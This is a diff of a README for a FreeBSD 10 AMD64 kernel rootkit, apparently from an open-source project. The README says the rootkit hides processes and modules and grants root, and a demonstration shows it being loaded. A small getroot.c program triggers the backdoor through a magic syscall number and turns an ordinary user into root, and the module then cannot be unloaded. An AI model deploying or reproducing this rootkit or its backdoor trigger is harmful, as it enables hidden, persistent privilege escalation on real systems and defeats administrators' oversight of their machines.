@@ -1,13 +1,19 @@
-This is a small rootkit for FreeBSD 10 AMD64. Initially, it was just a POC for a rootkit I've written to test some stuff in MSR (Model Specific Registers) a long time ago but now I have added more two features in it. Now it can be used to hide a module or process and escalate the privileges to root. There's an easy way to know if this rootkit is already on the system, you just need to load the module again and the kernel will tell you if the file exists or not.
+This is a small rootkit for FreeBSD 10 AMD64. Initially, it was just a POC for a rootkit I've written to test some stuff in MSR (Model Specific Registers) a long time ago but now I have added more two features in it. Now it can be used to hide a module or process and escalate the privileges to root. There's an easy way to know if this rootkit is already on the system, you just need to load the module again and the kernel will tell you if the file already exists or not.
 
 It has been tested on FreeBSD 10.0-RELEASE AMD64.
+
+Features:
+
+Hide a process
+Hide a module
+Escalate the privileges to root
 
 Demonstration:
 
 ```
 $ su
 Password:
-root@rootkit:/usr/home/andersonc0d3 # kldload rootkit_amd64/rk.ko 
+root@rootkit:/usr/home/andersonc0d3 # kldload rootkit_amd64/rk.ko
 root@rootkit:/usr/home/andersonc0d3 # exit
 exit
 $ cd rootkit_amd64
@@ -64,15 +70,16 @@ $ cat getroot.c
 
 int main(void){
 	
-	asm("mov $0x31337,%rax");	
+	asm("mov $0x31337,%rax");
 	asm("syscall");
 
 	return 0;
 }
 $ ./getroot
-uid: 1001
 $ id
 uid=0(root) gid=0(wheel) groups=0(wheel)
 $ su
-root@rootkit:/usr/home/andersonc0d3/rootkit_amd64 #
+root@capsicum:/usr/home/andersonc0d3/rootkit_amd64 # kldunload rk
+kldunload: can't find file rk
+root@capsicum:/usr/home/andersonc0d3/rootkit_amd64 #
 ```
